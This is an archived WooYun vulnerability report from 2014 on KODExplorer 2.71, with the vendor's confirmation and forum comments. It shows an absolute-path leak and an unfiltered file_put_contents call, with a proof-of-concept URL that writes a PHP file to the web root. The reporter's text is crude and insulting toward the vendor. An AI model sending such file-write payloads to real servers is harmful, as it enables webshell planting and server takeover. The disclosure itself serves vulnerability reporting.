{"id": 48803, "wybug_id": "wooyun-2014-076293", "wybug_title": "芒果云KODExlporer 信息泄露+任意命令执行getshell(一）", "wybug_corp": "千帆网络工作室", "wybug_author": "狗狗侠", "wybug_date": "2014-09-16 23:08", "wybug_open_date": "2014-12-15 23:10", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向公众公开  简要描述： http://www.wooyun.org/bugs/wooyun-2014-075852厂商挑衅？？？？虚假漏洞 ？？？？难道要爆你整个菊花？？？我慢慢来。。。别怕疼。。。分给起 详细说明：  代码我是从官网下的。。。狗哥，等待通用奖励呢我也不用怎么分析了，自己下载套源码搭建吧！我不想喷厂商了。。。具体代码我贴关键。。。估计厂商自己懂。。。先爆一颗信息泄露，你的绝对路径泄露了。。。我也是一个个文件看过来的在controller\\app.class.php中\npublic function index() {        $this->display(TEMPLATE.'app/index.php');    }\n跟踪父类Controller\nprotected function display($tpl_file){\t\tglobal $L,$LNG;\t\t\t\t//var_dump($this->values);exit();\t\textract($this->values);\t\trequire($this->tpl.$tpl_file);\t}\n看看他包含的模板吧！你找下templeate/index.php中\n<script src=\"<?php echo STATIC_PATH;?>js/lib/seajs/sea.js\"></script><script type=\"text/javascript\">          var LNG = <?php echo json_encode($L);?>;\tvar G = {\t\tis_root \t: <?php echo  $GLOBALS['is_root'];?>,\t\tweb_root \t: \"<?php echo $GLOBALS['web_root'];?>\",\t\tweb_host \t: \"<?php echo HOST;?>\",\t\tstatic_path : \"<?php echo STATIC_PATH;?>\",        basic_path  : \"<?php echo BASIC_PATH;?>\",\t\tversion \t: \"<?php echo KOD_VERSION;?>\"    };\n其中的\nweb_host \t: \"<?php echo HOST;?>\",\t\tstatic_path : \"<?php echo STATIC_PATH;?>\",        basic_path  : \"<?php echo BASIC_PATH;?>\",\t\tversion \t: \"<?php echo KOD_VERSION;?>\"\n厂商你是怎么想的？？？你难道想把你的菊花爆出来让人艹么？？？看看本地的截图\n\n看到了么？\nweb_root \t: \"E:/wwwroot/\",\t\tweb_host \t: \"http://localhost/\",\t\tstatic_path : \"./static/\",        basic_path  : \"E:/wwwroot/www/\",\t\tversion \t: \"2.71\"\n看getshell吧！分给起。。。不然到时候给你爆更多。。。0x02 getshell看你的第二个方法\npublic function user_app() {\t  //phpinfo();\t//var_dump($this->in['path']);exit();         $path = _DIR($this->in['path']);\t\t //echo $path.\"<br/>\";        if (isset($this->in['action']) && $this->in['action'] == 'add'){            $path .= '.oexe';                    }        $data = json_decode(rawurldecode($this->in['data']),true);        unset($data['name']);unset($data['desc']);unset($data['group']);        $res  = file_put_contents($path, json_encode($data));        show_json($this->L['success']);    }\n这里$path 我也就不解释怎么来的了，厂商你懂。。。我就get过来吧，方便点\n$data = json_decode(rawurldecode($this->in['data']),true);        unset($data['name']);unset($data['desc']);unset($data['group']);        $res  = file_put_contents($path, json_encode($data));\n看到没？直接$this->in['data']过来的数据？？ 有过滤吗？ 直接rawurldecode ,然后json_decode然后删除几个数组，直接写文件。。。你考虑过你的用户菊花疼吗？我给你来写个文件试试。。。http://localhost/www/index.php?app/user_app&path=fuck.php&data={\"name\":\"1\",\"desc\":\"2\",\"group\":\"3\",\"0\":\"<?php phpinfo();?>\"}我也不解释了。。。厂商你这么牛逼，你懂的。。。。直接写根目录了。。。。看截图\n\n\n\n\n\n   漏洞证明：  我也不解释了。。。厂商你这么牛逼，你懂的。。。。直接写根目录了。。。。看截图\n\n\n\n\n\n   修复方案：  还修复啥。。都尼玛都是虚假漏洞   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-17 10:52 厂商回复： 这个确实比较严重，我们尽快修复， 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-16 23:19 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @疯狗  这不上主页了？    \n     2014-09-16 23:45 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  顶西毒    \n     2014-09-16 23:48 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  保持一级戒备状态，坐等厂商回复！    \n     2014-09-17 00:35 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  这不，上主页了！    \n     2014-09-17 01:05 |    \t\t宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:33        | 我是好宝宝)\t\t \n  狗狗侠牛逼，对待这种二逼厂商别仁慈，一点都不珍惜别人的劳动果实，使劲爆他菊花    \n     2014-09-17 01:11 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @pandas 我是狗狗侠 认错了。前辈    \n     2014-09-17 03:33 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  @狗狗侠 大狗侠，消消气，啃啃骨头什么的，厂家的产品还是不错的：）    \n     2014-09-17 09:18 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  @狗狗侠 狗哥消消氣～     \n     2014-09-17 10:56 |    \t\t千帆网络工作室(乌云厂商)\t\t \n  本无意冒犯大神；之前两个确实属于级别低的，而且该项目只是一个管理工具；并非开放使用的；所以路径相关的由于程序需要没做过多的封装；但保证安全是我应该要做好的。没做好也欢迎批评指正。但你也知道一个人，搞个开源工具也不容易；如有冒犯请见谅    \n     2014-09-17 10:58 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @千帆网络工作室  但你说的是虚假漏洞。然后忽略，啥意思    \n     2014-09-17 11:04 |    \t\t千帆网络工作室(乌云厂商)\t\t \n  @狗狗侠 之前两个测试确实不通过啊    \n     2014-09-17 11:11 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @千帆网络工作室  好了 打住吧   通不通过自己有数    \n     2014-09-18 21:29 |    \t\tJuly \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:8        | 红星闪闪)\t\t \n  来个蝙蝠侠    \n     2014-09-20 16:09 |    \t\tzsx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | undefined)\t\t \n  前几天刚移植的啊……    \n     2014-12-16 00:04 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  在中国做开源也不容易，大家理解理解吧    \n     2014-12-16 02:54 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  等待 （二）（三）（四）（五）（六）（七）（八） 点点点点点点    \n     2014-12-16 09:10 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @狗狗侠 我觉得你应该带上版本的截图，他就不能狡辩了，或许真的有可能版本不对称造成的测试不存在（个人观点，轻喷……）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}